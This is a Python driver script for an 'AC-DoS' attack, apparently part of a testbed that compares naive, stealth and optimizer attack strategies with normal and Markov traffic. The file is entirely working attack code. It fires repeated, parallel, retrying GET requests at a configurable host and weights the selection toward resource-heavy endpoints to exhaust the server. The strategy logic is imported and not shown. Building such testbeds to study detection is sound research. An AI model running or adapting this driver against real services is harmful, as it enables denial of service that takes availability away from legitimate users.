"""
attack.py — Main attack loop driver.

Usage:
  python attack.py --strategy naive   --steps 100 --host http://localhost:5000
  python attack.py --strategy stealth --steps 200
  python attack.py --strategy optimizer
"""

import argparse
import time
import yaml
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from strategy import NormalTraffic, NaiveAttack, StealthAttack, OptimizerAttack, MarkovTraffic

ATTACK_DIR = Path(__file__).resolve().parent

ENDPOINTS_FILE = ATTACK_DIR / "endpoints.yaml"
STRATEGIES = {
    "normal":    NormalTraffic,
    "naive":     NaiveAttack,
    "stealth":   StealthAttack,
    "optimizer": OptimizerAttack,
    "markov":    MarkovTraffic,
}


def load_endpoints(path):
    """Load the attacker's flat list of endpoints."""
    with open(path) as f:
        data = yaml.safe_load(f)
    return data.get("endpoints", [])


def resolve_url(host, endpoint):
    """Replace {param} placeholders with a default value of 1."""
    import re
    path = re.sub(r"\{[^}]+\}", "1", endpoint["url"])
    return host.rstrip("/") + path


def _do_request(host, strategy, step):
    """Pick next endpoint from strategy; retry with a new selection on error or non-200."""
    while True:
        endpoint = strategy.next_endpoint()
        if endpoint is None:
            return None, -1
        url = resolve_url(host, endpoint)
        t0 = time.time()
        try:
            resp = requests.get(url, timeout=120)
            elapsed_ms = (time.time() - t0) * 1000
            kind = endpoint.get("kind", "?")
            if resp.status_code == 200:
                print(f"[{step}] {url} [{kind}] -> 200 ({elapsed_ms:.1f}ms)")
                return endpoint, elapsed_ms
            print(f"[{step}] {url} [{kind}] -> {resp.status_code} ({elapsed_ms:.1f}ms) — retry")
        except requests.RequestException as e:
            print(f"[{step}] {url} -> ERROR: {e} — retry")


def parse_duration(s: str) -> float:
    """Parse a duration string like '6m', '90s', '1.5h' into seconds."""
    s = s.strip().lower()
    if s.endswith("h"):
        return float(s[:-1]) * 3600
    if s.endswith("m"):
        return float(s[:-1]) * 60
    if s.endswith("s"):
        return float(s[:-1])
    return float(s)


def run(strategy, host, steps, delay, parallel, deadline=None):
    import os, signal
    step = 0
    while step < steps:
        if deadline is not None and time.time() >= deadline:
            print(f"[attack] max-time reached after {step} steps — killing process.")
            os.kill(os.getpid(), signal.SIGTERM)
            return
        count = min(parallel, steps - step)
        with ThreadPoolExecutor(max_workers=count) as ex:
            futures = [ex.submit(_do_request, host, strategy, step + i + 1)
                       for i in range(count)]
            for f in as_completed(futures):
                if deadline is not None and time.time() >= deadline:
                    print(f"[attack] max-time reached mid-batch — killing process.")
                    os.kill(os.getpid(), signal.SIGTERM)
                    return
                ep, elapsed_ms = f.result()
                if ep is not None:
                    strategy.on_response(ep, elapsed_ms)

        step += count
        if delay > 0:
            time.sleep(delay)


def main():
    parser = argparse.ArgumentParser(description="AC-DoS attack driver.")
    parser.add_argument("--strategy", choices=STRATEGIES.keys(), default="naive")
    parser.add_argument("--host", default="http://localhost:8700")
    parser.add_argument("--steps", type=int, default=100)
    parser.add_argument("--delay", type=float, default=0.0, help="Seconds between batches")
    parser.add_argument("--parallel", type=int, default=1, help="Parallel requests per batch")
    parser.add_argument("--endpoints", default=ENDPOINTS_FILE)
    parser.add_argument("--heavy", type=float, default=1.0, help="Exponent p for naive score weighting (p>1 emphasizes heavy endpoints)")
    parser.add_argument("--max-time", default=None,
                        help="Maximum run duration, e.g. 6m, 90s, 1.5h. "
                             "Attack stops early if this elapses before --steps complete.")
    args = parser.parse_args()

    deadline = None
    if args.max_time:
        duration = parse_duration(args.max_time)
        deadline = time.time() + duration
        print(f"[attack] max-time={args.max_time} ({duration:.0f}s)")

    endpoints = load_endpoints(args.endpoints)
    if args.strategy == "naive" and args.heavy != 1.0:
        strategy = STRATEGIES["naive"](endpoints, p=args.heavy)
    else:
        strategy = STRATEGIES[args.strategy](endpoints)

    print(f"Starting {args.strategy} attack: {args.steps} steps against {args.host} "
          f"(parallel={args.parallel}, pool={len(endpoints)}, heavy={args.heavy})")
    run(strategy, args.host, args.steps, args.delay, args.parallel, deadline=deadline)


if __name__ == "__main__":
    main()
